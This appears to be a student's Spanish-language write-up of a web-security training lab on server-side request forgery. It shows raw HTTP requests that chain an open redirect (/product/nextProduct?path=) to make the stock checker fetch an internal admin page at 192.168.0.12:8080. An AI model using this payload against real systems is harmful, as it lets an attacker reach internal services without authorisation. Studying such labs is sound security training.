---
title: "5 - SSRF with filter bypass via open redirection vulnerability"
---

# 5 - SSRF with filter bypass via open redirection vulnerability

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.

Haciendo una request directamente no deja, pero pasando la request a un open redirect que haga la petición interna ==bypaseamos ese filtro==

``` request
POST /product/stock HTTP/2
Host: 0ab800830446a8588300a0ef00af0072.web-security-academy.net
Cookie: session=cCW4DzYlJqVFwOCgCJCACF9jEQR9bhFK; session=2XI0cPpWGMLj7a8udnXgPDin9nje3PQ1
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: */*
Origin: https://0ab800830446a8588300a0ef00af0072.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ab800830446a8588300a0ef00af0072.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

aprovechándonos de esta petición :

```request

GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
Host: 0ab800830446a8588300a0ef00af0072.web-security-academy.net
Cookie: session=DGeSsz30YMo7s8mspnNqwmWV28TZ4tCr; session=2XI0cPpWGMLj7a8udnXgPDin9nje3PQ1
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab800830446a8588300a0ef00af0072.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i
```
